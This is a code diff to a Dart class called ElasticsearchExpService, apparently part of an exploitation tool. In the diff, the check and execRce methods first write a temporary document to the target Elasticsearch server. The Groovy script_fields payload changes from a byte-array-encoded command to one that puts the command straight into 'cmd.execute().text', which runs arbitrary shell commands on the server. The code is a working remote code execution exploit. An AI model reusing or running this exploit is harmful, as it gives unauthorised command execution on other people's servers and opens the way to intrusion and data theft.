@@ -264,6 +264,15 @@ class ElasticsearchExpService {
 
   Future<ExpResult> check() async {
     try {
+      // 先创建临时文档确保有数据
+      await http
+          .post(
+            Uri.parse('$_base/matrix_check/doc/1'),
+            headers: {'Content-Type': 'application/json'},
+            body: jsonEncode({'check': 'data'}),
+          )
+          .timeout(timeout);
+
       final payload = jsonEncode({
         'size': 1,
         'script_fields': {
@@ -288,14 +297,20 @@ class ElasticsearchExpService {
 
   Future<String?> execRce(String cmd) async {
     try {
-      final cmdBytes = RceEncoder.groovyByteArray(cmd);
+      // 先创建临时文档确保有数据
+      await http
+          .post(
+            Uri.parse('$_base/matrix_exec/doc/1'),
+            headers: {'Content-Type': 'application/json'},
+            body: jsonEncode({'exec': 'data'}),
+          )
+          .timeout(timeout);
+
       final payload = jsonEncode({
         'size': 1,
         'script_fields': {
           'result': {
-            'script':
-                "def cmd=new String([$cmdBytes] as byte[]);"
-                "def res=cmd.execute().text; res",
+            'script': 'def cmd="$cmd"; def res=cmd.execute().text; res',
           },
         },
       });
